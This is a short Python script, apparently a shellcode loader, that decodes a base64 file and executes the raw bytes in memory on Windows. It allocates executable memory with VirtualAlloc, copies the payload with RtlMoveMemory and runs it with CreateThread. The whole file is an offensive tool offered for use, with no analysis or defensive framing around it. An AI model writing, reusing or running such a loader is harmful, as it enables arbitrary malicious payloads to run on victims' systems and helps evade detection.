import base64
import ctypes
import platform


def execute_shellcode(shellcode_bytes):
    if platform.system() != "Windows":
        print("[!] Shellcode loader is currently Windows-only.")
        return False
    try:
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            None, len(shellcode_bytes), 0x3000, 0x40
        )
        ctypes.windll.kernel32.RtlMoveMemory(
            ctypes.c_void_p(ptr), shellcode_bytes, len(shellcode_bytes)
        )
        thread = ctypes.windll.kernel32.CreateThread(
            None, 0, ctypes.c_void_p(ptr), None, 0, None
        )
        ctypes.windll.kernel32.WaitForSingleObject(thread, -1)
        return True
    except Exception as e:
        print(f"[!] Injection failed: {e}")
        return False


if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python shellcode_loader.py <base64_shellcode_file>")
        sys.exit(1)

    with open(sys.argv[1], "r") as f:
        b64 = f.read()
        raw_shellcode = base64.b64decode(b64)

    execute_shellcode(raw_shellcode)
